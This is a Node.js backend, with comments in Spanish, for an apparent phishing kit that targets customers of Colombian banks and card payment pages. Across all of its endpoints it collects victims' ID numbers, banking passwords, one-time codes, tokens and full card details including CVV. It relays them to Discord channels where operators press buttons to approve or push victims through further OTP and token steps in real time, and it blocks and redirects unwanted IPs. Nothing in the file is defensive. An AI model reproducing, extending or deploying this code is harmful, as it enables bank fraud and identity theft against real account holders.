require('dotenv').config();
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events } = require('discord.js');
const http = require('http');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const bancos = require('./bancos');

// ============================================
// CONFIGURACIÓN
// ============================================
const TOKEN = process.env.DISCORD_TOKEN;
const HTTP_PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'cambiar-este-secret-urgente';
const DATA_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || './data';

const ADMINS = [
    { user: process.env.ADMIN_1_USER, pass: process.env.ADMIN_1_PASS },
    { user: process.env.ADMIN_2_USER, pass: process.env.ADMIN_2_PASS }
].filter(a => a.user && a.pass);

// Asegurar carpeta de datos
if (!fs.existsSync(DATA_DIR)) {
    try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) { console.error('No se pudo crear DATA_DIR:', e.message); }
}

// ============================================
// ESTADO EN MEMORIA
// ============================================
const estadoSesiones = new Map();
const datosSesiones = new Map();
const usuariosActivos = new Map();
const rateLimits = new Map();
const tokensInvalidos = new Set();

// IPs bloqueadas
let ipsBloqueadas = new Set();
const IP_BLOQUEADAS_FILE = path.join(DATA_DIR, 'bloqueadas.json');
try {
    if (fs.existsSync(IP_BLOQUEADAS_FILE)) {
        ipsBloqueadas = new Set(JSON.parse(fs.readFileSync(IP_BLOQUEADAS_FILE, 'utf8')));
        console.log(`🚫 IPs bloqueadas cargadas: ${ipsBloqueadas.size}`);
    }
} catch (e) { console.error('Error cargando IPs:', e.message); }

function guardarIpsBloqueadas() {
    try { fs.writeFileSync(IP_BLOQUEADAS_FILE, JSON.stringify([...ipsBloqueadas], null, 2)); }
    catch (e) { console.error('Error guardando IPs:', e.message); }
}

// Logs admin
const LOGS_FILE = path.join(DATA_DIR, 'logs-admin.json');
let logsAdmin = [];
try {
    if (fs.existsSync(LOGS_FILE)) logsAdmin = JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
} catch (e) {}

function agregarLog(tipo, datos) {
    logsAdmin.unshift({ tipo, datos, fecha: new Date().toISOString() });
    if (logsAdmin.length > 500) logsAdmin = logsAdmin.slice(0, 500);
    try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {}
}

// ============================================
// DISCORD (SIEMPRE ACTIVO - como antes)
// ============================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once(Events.ClientReady, (c) => {
    console.log(`🤖 Discord listo como ${c.user.tag}`);
    console.log(`📡 Bancos configurados: ${Object.keys(bancos).length}`);
    Object.entries(bancos).forEach(([key, banco]) => {
        console.log(`   - ${key} → ${banco.canalId}`);
    });
});

// ============================================
// HELPERS — EMBEDS
// ============================================
function buildEmbedInicial(banco, bancoKey, datos, sessionId) {
    const { tipo, tipoDoc, identificacion, clave, tarjeta } = datos;
    const embed = new EmbedBuilder()
        .setTitle(`${banco.nombre} - Nuevo registro`)
        .setColor(banco.color)
        .addFields(
            { name: '🎫 Tipo', value: tipo || 'N/A', inline: false },
            { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
            { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
        );
    if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
    if (tarjeta) embed.addFields({ name: '💳 Últ. 4 dígitos', value: tarjeta, inline: true });
    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
    return embed;
}

function buildEmbedToken(banco, bancoKey, datos, sessionId, tokenValor) {
    const { tipoDoc, identificacion, clave } = datos;
    const embed = new EmbedBuilder()
        .setTitle(`${banco.nombre} - Verificación Token`)
        .setColor(banco.color)
        .addFields(
            { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
            { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
        );
    if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
    embed.addFields({ name: '🔢 Token', value: `\`${tokenValor}\``, inline: false });
    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
    return embed;
}

function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
    const { tipoDoc, identificacion, clave } = datos;
    const embed = new EmbedBuilder()
        .setTitle(`${banco.nombre} - Verificación OTP`)
        .setColor(banco.color)
        .addFields(
            { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
            { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
        );
    if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
    embed.addFields({ name: '📱 OTP', value: `\`${otpValor}\``, inline: false });
    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
    return embed;
}

function buildEmbedTarjeta(banco, bancoKey, datos, sessionId) {
    const { marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
    const marcaTexto = marca === 'visa' ? 'VISA' : 'MASTERCARD';
    const colorMarca = marca === 'visa' ? 0x1434CB : 0xEB001B;
    const embed = new EmbedBuilder()
        .setTitle(`💳 ${marcaTexto} - Nuevo pago`)
        .setColor(colorMarca)
        .addFields(
            { name: '🏷️ Marca', value: marcaTexto, inline: true },
            { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: true },
            { name: '🗓️ Expira', value: `${expMes || '--'}/${expAnio || '--'}`, inline: true },
            { name: '🔒 CVV', value: `\`${cvv || '---'}\``, inline: true },
            { name: '👤 Titular', value: titular || '(vacío)', inline: false },
            { name: '📄 Documento', value: `${docType || 'CC'} ${docNumber || '(vacío)'}`, inline: true },
            { name: '💰 Monto', value: `$${Number(monto || 0).toLocaleString('es-CO')} COP`, inline: true }
        );
    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
    return embed;
}

function buildEmbedOtpTarjeta(banco, bancoKey, datos, sessionId, otpValor) {
    const { marca, tarjeta, titular, docType, docNumber, monto } = datos;
    const marcaTexto = marca === 'visa' ? 'VISA' : 'MASTERCARD';
    const colorMarca = marca === 'visa' ? 0x1434CB : 0xEB001B;
    const embed = new EmbedBuilder()
        .setTitle(`🔐 ${marcaTexto} - Clave Dinámica`)
        .setColor(colorMarca)
        .addFields(
            { name: '🏷️ Marca', value: marcaTexto, inline: true },
            { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: true },
            { name: '👤 Titular', value: titular || '(vacío)', inline: false },
            { name: '📄 Documento', value: `${docType || 'CC'} ${docNumber || '(vacío)'}`, inline: true },
            { name: '💰 Monto', value: `$${Number(monto || 0).toLocaleString('es-CO')} COP`, inline: true },
            { name: '📱 Clave Dinámica', value: `\`${otpValor}\``, inline: false }
        );
    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
    return embed;
}

// ============================================
// BOTONES
// ============================================
function buildButtonsInicial(bancoKey, sessionId) {
    if (bancoKey === 'bogota') {
        return new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`TOKEN|${bancoKey}|${sessionId}`).setLabel('🔢 Token').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
        );
    }
    if (['caja-social', 'bbva', 'popular', 'occidente'].includes(bancoKey)) {
        return new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId(`TOKEN|${bancoKey}|${sessionId}`).setLabel('🔢 Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`OTP|${bancoKey}|${sessionId}`).setLabel('📱 OTP').setStyle(ButtonStyle.Success)
        );
    }
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId(`OTP|${bancoKey}|${sessionId}`).setLabel('📱 OTP').setStyle(ButtonStyle.Primary)
    );
}

function buildButtonsToken(bancoKey, sessionId) {
    if (['caja-social', 'bbva', 'popular', 'occidente'].includes(bancoKey)) {
        return new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId(`OTP|${bancoKey}|${sessionId}`).setLabel('📱 OTP').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`).setLabel('✅ Finalizar').setStyle(ButtonStyle.Success)
        );
    }
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`OTP|${bancoKey}|${sessionId}`).setLabel('📱 OTP').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`).setLabel('✅ Finalizar').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
    );
}

function buildButtonsOtp(bancoKey, sessionId) {
    if (['caja-social', 'bbva', 'popular', 'occidente'].includes(bancoKey)) {
        return new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`).setLabel('✅ Finalizar').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`TOKEN|${bancoKey}|${sessionId}`).setLabel('🔢 Token').setStyle(ButtonStyle.Primary)
        );
    }
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`).setLabel('✅ Finalizar').setStyle(ButtonStyle.Success)
    );
}

// ============================================
// UTILIDADES
// ============================================
function getRealIP(req) {
    const xff = req.headers['x-forwarded-for'];
    if (xff) return xff.split(',')[0].trim();
    return req.socket.remoteAddress || 'desconocida';
}

function getBody(req, maxSize = 100 * 1024) {
    return new Promise((resolve, reject) => {
        let body = '';
        let size = 0;
        req.on('data', chunk => {
            size += chunk.length;
            if (size > maxSize) { reject(new Error('Body demasiado grande')); req.destroy(); return; }
            body += chunk;
        });
        req.on('end', () => {
            try { resolve(body ? JSON.parse(body) : {}); }
            catch (e) { reject(new Error('JSON inválido')); }
        });
        req.on('error', reject);
    });
}

function json(res, code, obj) {
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
}

function checkRateLimit(ip, tipo = 'publico') {
    const limites = {
        publico: { max: 30, ventana: 60 * 1000 },
        login:   { max: 5,  ventana: 15 * 60 * 1000 },
        admin:   { max: 300, ventana: 60 * 1000 }
    };
    const { max, ventana } = limites[tipo] || limites.publico;
    const ahora = Date.now();
    const key = `${tipo}:${ip}`;
    let reg = rateLimits.get(key);
    if (!reg || ahora > reg.resetAt) reg = { count: 0, resetAt: ahora + ventana };
    reg.count++;
    rateLimits.set(key, reg);
    if (reg.count > max) {
        ipsBloqueadas.add(ip);
        guardarIpsBloqueadas();
        agregarLog('auto-bloqueo', { ip, tipo, motivo: `Excedió ${max} peticiones en ${ventana/1000}s` });
        console.log(`🚫 IP auto-bloqueada: ${ip} (${tipo})`);
        return false;
    }
    return true;
}

function verificarJWT(req, res) {
    const auth = req.headers['authorization'];
    if (!auth || !auth.startsWith('Bearer ')) { json(res, 401, { ok: false, error: 'No autenticado' }); return null; }
    const token = auth.slice(7);
    if (tokensInvalidos.has(token)) { json(res, 401, { ok: false, error: 'Sesión cerrada' }); return null; }
    try { return jwt.verify(token, JWT_SECRET); }
    catch (e) { json(res, 401, { ok: false, error: 'Token inválido' }); return null; }
}

// Limpieza de usuarios inactivos cada 10s
setInterval(() => {
    const ahora = Date.now();
    for (const [sid, datos] of usuariosActivos.entries()) {
        if (ahora - datos.ultimoHeartbeat > 30000) {
            usuariosActivos.delete(sid);
            console.log(`⏰ Usuario inactivo removido: ${sid}`);
        }
    }
}, 10000);

// ============================================
// SERVIDOR HTTP
// ============================================
const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, ngrok-skip-browser-warning');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    const ip = getRealIP(req);
    const url = req.url.split('?')[0];

    // Bloqueo de IP (excepto /health)
    if (url !== '/health' && ipsBloqueadas.has(ip)) {
        json(res, 403, { ok: false, error: 'IP bloqueada', redirect: 'https://www.google.com' });
        return;
    }

    // ========== SIRVE admin.html ==========
    if (req.method === 'GET' && (url === '/admin' || url === '/admin/')) {
        try {
            const adminPath = path.join(__dirname, 'admin.html');
            if (!fs.existsSync(adminPath)) {
                res.writeHead(404, { 'Content-Type': 'text/html' });
                res.end('<h1>admin.html no encontrado</h1>');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(fs.readFileSync(adminPath, 'utf8'));
            return;
        } catch (e) { res.writeHead(500); res.end('Error'); return; }
    }

    // ========== HEALTH ==========
    if (req.method === 'GET' && url === '/health') {
        json(res, 200, {
            ok: true,
            bancos: Object.keys(bancos).length,
            sesiones: estadoSesiones.size,
            activos: usuariosActivos.size,
            bloqueadas: ipsBloqueadas.size,
            discord: client.isReady()
        });
        return;
    }

    // ========== CHECK-IP ==========
    if (req.method === 'GET' && url === '/check-ip') {
        if (ipsBloqueadas.has(ip)) json(res, 403, { bloqueado: true, redirect: 'https://www.google.com' });
        else json(res, 200, { bloqueado: false, ip });
        return;
    }

    // ========== HEARTBEAT ==========
    if (req.method === 'POST' && url === '/heartbeat') {
        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
        try {
            const { sessionId, ultimaAccion } = await getBody(req);
            if (!sessionId) { json(res, 400, { ok: false }); return; }
            const previo = usuariosActivos.get(sessionId) || {};
            usuariosActivos.set(sessionId, {
                ip,
                ultimaAccion: ultimaAccion || 'activo',
                ultimoHeartbeat: Date.now(),
                userAgent: (req.headers['user-agent'] || '').slice(0, 200),
                entroEn: previo.entroEn || Date.now()
            });
            json(res, 200, { ok: true });
        } catch (e) { json(res, 400, { ok: false }); }
        return;
    }

    // ========== SALIR ==========
    if (req.method === 'POST' && url === '/salir') {
        try {
            const { sessionId } = await getBody(req);
            if (sessionId) { usuariosActivos.delete(sessionId); console.log(`👋 Salió: ${sessionId}`); }
        } catch (e) {}
        json(res, 200, { ok: true });
        return;
    }

    // ========== LOGIN ==========
    if (req.method === 'POST' && url === '/admin/login') {
        if (!checkRateLimit(ip, 'login')) { json(res, 429, { ok: false, error: 'Demasiados intentos' }); return; }
        try {
            const { usuario, password } = await getBody(req);
            const admin = ADMINS.find(a => a.user === usuario);
            const valido = admin && admin.pass === password;
            agregarLog('login', { ip, usuario, exito: valido });
            if (!valido) { json(res, 401, { ok: false, error: 'Credenciales inválidas' }); return; }
            const token = jwt.sign({ user: usuario }, JWT_SECRET, { expiresIn: '8h' });
            json(res, 200, { ok: true, token, usuario });
        } catch (e) { json(res, 400, { ok: false, error: e.message }); }
        return;
    }

    // ========== LOGOUT ==========
    if (req.method === 'POST' && url === '/admin/logout') {
        const auth = req.headers['authorization'];
        if (auth && auth.startsWith('Bearer ')) tokensInvalidos.add(auth.slice(7));
        json(res, 200, { ok: true });
        return;
    }

    // ========== ADMIN ENDPOINTS ==========
    if (url.startsWith('/admin/')) {
        if (!checkRateLimit(ip, 'admin')) { json(res, 429, { ok: false }); return; }
        const payload = verificarJWT(req, res);
        if (!payload) return;

        if (req.method === 'GET' && url === '/admin/activos') {
            const lista = [];
            for (const [sid, d] of usuariosActivos.entries()) {
                lista.push({
                    sessionId: sid, ip: d.ip, ultimaAccion: d.ultimaAccion,
                    tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000),
                    userAgent: d.userAgent
                });
            }
            json(res, 200, { ok: true, activos: lista });
            return;
        }

        if (req.method === 'GET' && url === '/admin/sesiones') {
            const lista = [];
            for (const [sid, estado] of estadoSesiones.entries()) {
                lista.push({ sessionId: sid, estado, datos: datosSesiones.get(sid) || {} });
            }
            json(res, 200, { ok: true, sesiones: lista });
            return;
        }

        const matchAccion = url.match(/^\/admin\/sesion\/([^\/]+)\/accion$/);
        if (req.method === 'POST' && matchAccion) {
            const sessionId = matchAccion[1];
            try {
                const { accion } = await getBody(req);
                const mapEstados = { ACEPTAR: 'aceptado', RECHAZAR: 'rechazado', OTP: 'otp', TOKEN: 'token', FINALIZAR: 'finalizado' };
                if (!mapEstados[accion]) { json(res, 400, { ok: false }); return; }
                estadoSesiones.set(sessionId, mapEstados[accion]);
                agregarLog('accion', { usuario: payload.user, sessionId, accion });
                console.log(`🎯 ${payload.user} → ${accion} → ${sessionId}`);
                json(res, 200, { ok: true, estado: mapEstados[accion] });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'GET' && url === '/admin/ips-bloqueadas') {
            json(res, 200, { ok: true, ips: [...ipsBloqueadas] });
            return;
        }

        if (req.method === 'POST' && url === '/admin/ip/bloquear') {
            try {
                const { ip: ipB } = await getBody(req);
                if (!ipB) { json(res, 400, { ok: false }); return; }
                ipsBloqueadas.add(ipB);
                guardarIpsBloqueadas();
                agregarLog('bloqueo', { usuario: payload.user, ip: ipB });
                json(res, 200, { ok: true });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'POST' && url === '/admin/ip/desbloquear') {
            try {
                const { ip: ipD } = await getBody(req);
                ipsBloqueadas.delete(ipD);
                guardarIpsBloqueadas();
                agregarLog('desbloqueo', { usuario: payload.user, ip: ipD });
                json(res, 200, { ok: true });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'GET' && url === '/admin/logs') {
            json(res, 200, { ok: true, logs: logsAdmin.slice(0, 100) });
            return;
        }

        if (req.method === 'GET' && url === '/admin/stats') {
            json(res, 200, {
                ok: true,
                activos: usuariosActivos.size,
                sesiones: estadoSesiones.size,
                bloqueadas: ipsBloqueadas.size,
                pendientes: [...estadoSesiones.values()].filter(e => e === 'pendiente').length
            });
            return;
        }

        json(res, 404, { ok: false, error: 'Ruta admin no encontrada' });
        return;
    }

    // ========== CC-BOGOTA: enviar-pago ==========
    if (req.method === 'POST' && url === '/cc-bogota/enviar-pago') {
        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
        try {
            const datos = await getBody(req);
            const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
            if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
            estadoSesiones.set(sessionId, 'pendiente');
            datosSesiones.set(sessionId, { marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, ip });
            console.log(`💳 [cc-bogota] Nueva sesión: ${sessionId} (${marca}) IP=${ip}`);
            const banco = bancos['cc-bogota'];
            const embed = buildEmbedTarjeta(banco, 'cc-bogota', datos, sessionId);
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`ACEPTAR|cc-bogota|${sessionId}`).setLabel('✅ Aceptar').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`RECHAZAR|cc-bogota|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
            );
            const channel = await client.channels.fetch(banco.canalId);
            await channel.send({ embeds: [embed], components: [row] });
            json(res, 200, { ok: true, sessionId });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    // ========== CC-BOGOTA: enviar-otp ==========
    if (req.method === 'POST' && url === '/cc-bogota/enviar-otp') {
        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
        try {
            const { sessionId, otp } = await getBody(req);
            if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
            const datosOriginales = datosSesiones.get(sessionId) || {};
            const datosCompletos = Object.assign({}, datosOriginales, { otp });
            estadoSesiones.set(sessionId, 'pendiente');
            datosSesiones.set(sessionId, datosCompletos);
            console.log(`📱 [cc-bogota] OTP: ${sessionId} → ${otp}`);
            const banco = bancos['cc-bogota'];
            const embed = buildEmbedOtpTarjeta(banco, 'cc-bogota', datosCompletos, sessionId, otp);
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`ACEPTAR|cc-bogota|${sessionId}`).setLabel('✅ Aceptar').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`RECHAZAR|cc-bogota|${sessionId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
            );
            const channel = await client.channels.fetch(banco.canalId);
            await channel.send({ embeds: [embed], components: [row] });
            json(res, 200, { ok: true, sessionId });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    // ========== /:banco/enviar (PSE tradicional) ==========
    const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
    if (req.method === 'POST' && enviarMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
        const bancoKey = enviarMatch[1];
        const banco = bancos[bancoKey];
        if (!banco) { json(res, 404, { ok: false, error: 'Banco no existe' }); return; }
        try {
            const datos = await getBody(req);
            const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
            if (!sessionId) { json(res, 400, { ok: false }); return; }
            estadoSesiones.set(sessionId, 'pendiente');
            datosSesiones.set(sessionId, { tipo, tipoDoc, identificacion, clave, tarjeta, token, ip });
            console.log(`📥 [${bancoKey}] Nueva sesión: ${sessionId}`);
            const embed = buildEmbedInicial(banco, bancoKey, datos, sessionId);
            const row = buildButtonsInicial(bancoKey, sessionId);
            const channel = await client.channels.fetch(banco.canalId);
            await channel.send({ embeds: [embed], components: [row] });
            json(res, 200, { ok: true, sessionId });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    // ========== /:banco/enviar-token ==========
    const tokenMatch = url.match(/^\/([a-z-]+)\/enviar-token$/);
    if (req.method === 'POST' && tokenMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
        const bancoKey = tokenMatch[1];
        const banco = bancos[bancoKey];
        if (!banco) { json(res, 404, { ok: false }); return; }
        try {
            const { sessionId, token } = await getBody(req);
            if (!sessionId || !token) { json(res, 400, { ok: false }); return; }
            const datosCompletos = Object.assign({}, datosSesiones.get(sessionId) || {}, { token });
            datosSesiones.set(sessionId, datosCompletos);
            estadoSesiones.set(sessionId, 'token');
            console.log(`🔢 [${bancoKey}] Token: ${sessionId} → ${token}`);
            const embed = buildEmbedToken(banco, bancoKey, datosCompletos, sessionId, token);
            const row = buildButtonsToken(bancoKey, sessionId);
            const channel = await client.channels.fetch(banco.canalId);
            await channel.send({ embeds: [embed], components: [row] });
            json(res, 200, { ok: true });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    // ========== /:banco/enviar-otp (PSE) ==========
    const otpMatch = url.match(/^\/([a-z-]+)\/enviar-otp$/);
    if (req.method === 'POST' && otpMatch && otpMatch[1] !== 'cc-bogota') {
        if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
        const bancoKey = otpMatch[1];
        const banco = bancos[bancoKey];
        if (!banco) { json(res, 404, { ok: false }); return; }
        try {
            const { sessionId, otp } = await getBody(req);
            if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
            const datosCompletos = Object.assign({}, datosSesiones.get(sessionId) || {}, { otp });
            datosSesiones.set(sessionId, datosCompletos);
            estadoSesiones.set(sessionId, 'otp');
            console.log(`📱 [${bancoKey}] OTP: ${sessionId} → ${otp}`);
            const embed = buildEmbedOtp(banco, bancoKey, datosCompletos, sessionId, otp);
            const row = buildButtonsOtp(bancoKey, sessionId);
            const channel = await client.channels.fetch(banco.canalId);
            await channel.send({ embeds: [embed], components: [row] });
            json(res, 200, { ok: true });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    // ========== GET /:banco/estado/:sessionId ==========
    const estadoMatch = url.match(/^\/([a-z-]+)\/estado\/([^\/?]+)/);
    if (req.method === 'GET' && estadoMatch) {
        const bancoKey = estadoMatch[1];
        const sessionId = estadoMatch[2];
        if (!bancos[bancoKey]) { json(res, 404, { ok: false }); return; }
        const estado = estadoSesiones.get(sessionId) || 'pendiente';
        json(res, 200, { estado });
        return;
    }

    // 404
    res.writeHead(404);
    res.end('Not found');
});

server.timeout = 15000;
server.keepAliveTimeout = 20000;
server.headersTimeout = 25000;

server.listen(HTTP_PORT, () => {
    console.log(`🌐 HTTP corriendo en puerto ${HTTP_PORT}`);
    console.log(`📁 DATA_DIR: ${DATA_DIR}`);
    console.log(`👤 Admins: ${ADMINS.map(a => a.user).join(', ') || '⚠️ NINGUNO'}`);
    console.log(`🚫 IPs bloqueadas: ${ipsBloqueadas.size}`);
});

// ============================================
// CLICS EN BOTONES DE DISCORD
// ============================================
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    console.log(`🔘 Botón: ${interaction.customId}`);
    const partes = interaction.customId.split('|');
    const accion = partes[0];
    const bancoKey = partes[1];
    const sessionId = partes[2];
    const usuario = interaction.user.username;
    try {
        if (accion === 'ACEPTAR') {
            estadoSesiones.set(sessionId, 'aceptado');
            await interaction.reply({ content: `✅ Sesión **${sessionId}** ACEPTADA por ${usuario}` });
        } else if (accion === 'RECHAZAR') {
            estadoSesiones.set(sessionId, 'rechazado');
            await interaction.reply({ content: `❌ Sesión **${sessionId}** RECHAZADA por ${usuario}` });
        } else if (accion === 'OTP') {
            estadoSesiones.set(sessionId, 'otp');
            await interaction.reply({ content: `📱 Sesión **${sessionId}** enviada a OTP por ${usuario}` });
        } else if (accion === 'TOKEN') {
            estadoSesiones.set(sessionId, 'token');
            await interaction.reply({ content: `🔢 Sesión **${sessionId}** enviada a TOKEN por ${usuario}` });
        } else if (accion === 'FINALIZAR') {
            estadoSesiones.set(sessionId, 'finalizado');
            await interaction.reply({ content: `✅ Sesión **${sessionId}** FINALIZADA por ${usuario}` });
        }
    } catch (e) { console.error('Error botón Discord:', e); }
});

// Conectar Discord
client.login(TOKEN).catch(e => console.error('Error login Discord:', e.message));